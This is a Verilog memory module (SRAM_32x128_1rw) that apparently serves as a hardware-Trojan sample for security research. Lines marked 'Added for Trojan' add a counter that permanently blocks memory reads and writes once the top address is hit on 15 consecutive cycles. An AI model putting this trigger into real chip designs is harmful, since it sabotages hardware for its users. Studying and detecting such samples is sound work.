module SRAM_32x128_1rw (
  clk0,
  csb0,
  web0,
  addr0,
  din0,
  dout0
);

  parameter DATA_WIDTH = 32;
  parameter ADDR_WIDTH = 7;
  parameter RAM_DEPTH  = 1 << ADDR_WIDTH;
  parameter DELAY      = 3;

  // Added for Trojan
  parameter RARE_SEQ   = 15; 

  input                   clk0;  
  input                   csb0;  
  input                   web0;  
  input  [ADDR_WIDTH-1:0] addr0;
  input  [DATA_WIDTH-1:0] din0;
  output reg [DATA_WIDTH-1:0] dout0;

  reg                  csb0_reg;
  reg                  web0_reg;
  reg [ADDR_WIDTH-1:0] addr0_reg;
  reg [DATA_WIDTH-1:0] din0_reg;

  reg [DATA_WIDTH-1:0] mem [0:RAM_DEPTH-1];

  // Added for Trojan
  reg [3:0] seq_counter;

  always @(posedge clk0) begin
    csb0_reg  <= csb0;
    web0_reg  <= web0;
    addr0_reg <= addr0;
    din0_reg  <= din0;

    // Update sequence counter
    if (addr0_reg == {ADDR_WIDTH{1'b1}})
      seq_counter <= seq_counter + 1'b1;
    else
      seq_counter <= 0;

    if (seq_counter < RARE_SEQ) begin
      if (!csb0_reg && web0_reg)
        $display($time, " Reading %m addr0=%b dout0=%b", addr0_reg, mem[addr0_reg]);
      if (!csb0_reg && !web0_reg)
        $display($time, " Writing %m addr0=%b din0=%b", addr0_reg, din0_reg);
    end
  end

  always @(negedge clk0) begin : MEM_WRITE0
    if (seq_counter < RARE_SEQ && !csb0_reg && !web0_reg)
      mem[addr0_reg] <= din0_reg;
  end

  always @(negedge clk0) begin : MEM_READ0
    if (seq_counter < RARE_SEQ && !csb0_reg && web0_reg)
      dout0 <= #(DELAY) mem[addr0_reg];
  end

endmodule